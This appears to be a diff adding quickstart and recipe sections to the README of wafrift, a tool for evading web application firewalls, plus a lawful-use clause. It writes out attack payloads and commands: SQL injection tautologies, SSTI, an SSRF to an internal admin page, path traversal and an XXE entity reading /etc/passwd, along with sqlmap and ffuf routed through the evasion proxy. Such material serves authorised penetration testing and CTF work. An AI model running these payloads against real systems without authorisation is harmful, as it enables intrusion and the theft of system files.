@@ -74,6 +74,58 @@ The gene bank (`~/.wafrift/genomes/`) persists learned bypasses across sessions.
 cargo install --path crates/cli
 ```
 
+## Quickstart
+
+Pick your workflow — each is copy-paste ready.
+
+### 🏁 CTF — "I have a SQLi but there's a WAF"
+
+```bash
+# Get bypass variants instantly (offline — no target needed)
+wafrift evade --payload "' OR 1=1--" --level heavy
+
+# Found a WAF? Fire all variants and see what gets through
+wafrift scan --target http://ctf.example/vuln --payload "' OR 1=1--"
+```
+
+### 🔍 Pentest — "sqlmap/ffuf behind a WAF"
+
+```bash
+# Start the evasion proxy
+cargo run -p wafrift-proxy -- --listen 127.0.0.1:8080
+
+# Route your tools through it
+sqlmap -u "https://target/x?id=1" --proxy="http://127.0.0.1:8080"
+ffuf -x http://127.0.0.1:8080 -u https://target/FUZZ -w wordlist.txt
+
+# Check live findings mid-session
+curl http://127.0.0.1:8080/_wafrift/findings.md
+```
+
+### 🎯 Bug Bounty — "Scan this target, give me a report"
+
+```bash
+# Full autonomous scan with JSON output
+wafrift scan --target https://target.com --payload "' UNION SELECT 1--" \
+  --param id --format json --output results.json
+
+# Generate a markdown writeup from findings
+wafrift report --only-host target.com --output writeup.md
+```
+
+### 🔴 Red Team — "Persistent evasion against Cloudflare"
+
+```bash
+# First scan learns what bypasses Cloudflare and saves to gene bank
+wafrift scan --target https://target.com --payload "' OR 1=1--"
+
+# Every future scan against Cloudflare starts with zero discovery phase
+# Gene bank at ~/.wafrift/genomes/ persists across sessions
+
+# Replay a specific bypass to prove reproducibility (CI gate: exits 2 if blocked)
+wafrift replay --target https://target.com --from-waf Cloudflare --param id
+```
+
 ## Usage
 
 ### Interactive Mode (default)
@@ -231,6 +283,70 @@ wafrift bench-diff --baseline baseline.json --current current.json --bypass-drop
 
 `wafrift-proxy` refuses upstream targets in private/loopback/RFC1918/link-local ranges by default; pass `--allow-private-upstream` only against lab targets you own. `wafrift replay` and the differential probes send genuinely exploitable strings — only run them against systems you control or have explicit written authorisation to test.
 
+### CTF / pentest quick recipes
+
+Five common shapes a security practitioner runs into. Every recipe is a single command — no setup beyond `cargo install wafrift` (or `docker run santhsecurity/wafrift`) and the `--target`/`--payload` you'd be testing anyway.
+
+**1. SQL-injection login bypass.** WAF blocks `' OR 1=1--`; find a variant that lands.
+
+```bash
+wafrift scan --target https://target/login \
+  --payload "' OR 1=1--" --param username --level heavy
+```
+
+Output prints which evasion technique chain produced the bypass. Replay later with the exact chain saved into the gene-bank — second run skips discovery.
+
+**2. SSTI in a server-side template.** Variant of `{{7*7}}` that the WAF allows but the engine still evaluates.
+
+```bash
+wafrift scan --target https://target/profile \
+  --payload "{{7*7}}" --param name --level heavy --only grammar/ssti,encoding
+```
+
+`--only grammar/ssti,encoding` keeps the search focused — running the full pipeline against a single template reflection is slow.
+
+**3. SSRF to internal admin.** Smuggle a `127.0.0.1:9000` request past a WAF that only blacklists string `127.0.0.1`.
+
+```bash
+wafrift scan --target https://target/preview \
+  --payload "http://127.0.0.1:9000/admin" --param url --level heavy \
+  --only encoding,grammar/ssrf
+```
+
+The differential probe set (`wafrift probe`) lists the sub-techniques the WAF reliably blocks for this class — handy when the scan comes back empty and you need to know what NOT to retry.
+
+**4. Path traversal / LFI.** WAF blocks `../`; find a variant that survives.
+
+```bash
+wafrift scan --target https://target/static \
+  --payload "../../../etc/passwd" --param file --level heavy \
+  --only encoding/url,encoding/unicode,grammar/path
+```
+
+**5. XXE in an XML body.** Practitioner has the request body in a file; want to scan with that exact body shape.
+
+```bash
+# Copy the request as cURL out of Burp/ZAP, paste through import-curl:
+pbpaste | wafrift import-curl --from-stdin \
+  --param xmlData --payload '<!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]><foo>&x;</foo>' \
+  --level heavy
+```
+
+**Saving and replaying findings.** Once a recipe lands a bypass, persist it to the gene-bank so subsequent runs (or teammates) don't re-do discovery:
+
+```bash
+wafrift seed --waf modsec-crs --technique EncodingDoubleUrl,GrammarTautology
+wafrift bank export --output bundle.json    # share with teammate
+wafrift bank import bundle.json             # on teammate's machine
+```
+
+Replay any saved finding deterministically:
+
+```bash
+wafrift replay --target https://target/login --param username \
+  --payload "' OR 1=1--" --from-host target  # exits 0 on bypass, 2 on block
+```
+
 ## Architecture
 
 ```
@@ -381,3 +497,28 @@ at your option.
 ### Contribution
 
 Unless you explicitly state otherwise, any contribution intentionally submitted for inclusion in the work by you, as defined in the Apache-2.0 license, shall be dual licensed as above, without any additional terms or conditions.
+
+## Lawful Use & Repository Responsibility
+
+wafrift is dual-use security research software. It implements WAF
+evasion techniques that, executed against systems you do not own or
+have written authorisation to test, may violate computer-misuse law
+(CFAA in the United States, Computer Misuse Act in the United Kingdom,
+StGB §202c in Germany, equivalent statutes elsewhere). By downloading,
+building, or running wafrift you agree:
+
+1. **Authorisation is yours alone.** You will only run wafrift against
+   systems you own, operate, or have explicit written authorisation to
+   test — bug-bounty scope, signed pentest agreement, CTF rules, or
+   lab infrastructure under your control. Verify scope before each
+   engagement.
+2. **Legal responsibility transfers to the operator.** The Santh
+   Security maintainers, contributors, and the project itself accept
+   no liability for traffic generated by, damages caused by, or legal
+   exposure resulting from your use of the tool.
+3. **Unauthorised use is out of scope of any support.** We will not
+   help users bypass WAFs protecting systems they have no authorisation
+   to interact with. Reports of misuse may be forwarded to the affected
+   organisation's `abuse@` / legal channels.
+
+Full clause and reporting workflow in [`SECURITY.md`](./SECURITY.md#lawful-use--repository-responsibility) and [`CODE_OF_CONDUCT.md`](./CODE_OF_CONDUCT.md#lawful-use--repository-responsibility).
